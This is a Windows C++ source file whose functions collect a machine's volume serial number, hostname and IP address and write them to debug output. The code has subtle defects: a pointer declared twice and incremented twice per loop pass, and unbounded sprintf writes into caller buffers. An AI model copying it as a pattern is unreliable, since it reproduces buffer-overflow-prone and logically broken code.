// Copyright 2015 Christian Roggia. All rights reserved.
// Use of this source code is governed by an Apache 2.0 license that can be
// found in the LICENSE file.

#include "network_info.hpp"

#include <iostream>
#include <Winsock2.h>
#include "StdAfx.hpp"
#include "debug.hpp"

BOOL GetVolumeSerialNumber(char *szVolSerial, DWORD dwSize)
{
	DWORD dwVolumeSerialNumber;

	if (FALSE == GetVolumeInformation(NULL, NULL, 0, &dwVolumeSerialNumber, NULL, NULL, NULL, 0))
		return FALSE;

	memset(szVolSerial, 0, dwSize);
	sprintf(szVolSerial, "%08X", dwVolumeSerialNumber);

	char *lpszVolSerial = szVolSerial;
	for(char *lpszVolSerial = szVolSerial; lpszVolSerial < &szVolSerial[dwSize]; lpszVolSerial++)
	{
		if (*lpszVolSerial >= 'a' && *lpszVolSerial <= 'z')
			*lpszVolSerial -= 32;

		++lpszVolSerial;
	}

	PRINTDBG("%s: Volume Serial - %s\n", __FUNCTION__, szVolSerial);
	return TRUE;
}

BOOL GetHostInfo(char *szHostname, DWORD dwSize, char *szHostByName)
{
	WSAData _WSAData;

	memset(szHostname, 0, dwSize);

	if (0 != WSAStartup(0x101, &_WSAData))
	{
		WSACleanup();
		return FALSE;
	}

	if (0 != gethostname(szHostname, dwSize))
	{
		WSACleanup();
		return FALSE;
	}

	hostent *h = (hostent *)gethostbyname(szHostname);
	if (NULL == h)
	{
		WSACleanup();
		return FALSE;
	}

	BOOL r = FALSE;
	for(int i = 0; ; i++)
	{
		struct in_addr *addr_list = (struct in_addr *)h->h_addr_list[i];
		if (NULL == addr_list)
			break;

		sprintf(szHostByName, "%s", inet_ntoa(*addr_list));
		if (strlen(szHostByName))
		{
			r = TRUE;
			break;
		}
	}

	WSACleanup();
	PRINTDBG("%s: Hostname - %s\n", __FUNCTION__, szHostname);
	PRINTDBG("%s: Host IP - %s\n", __FUNCTION__, szHostByName);
	
	return r;
}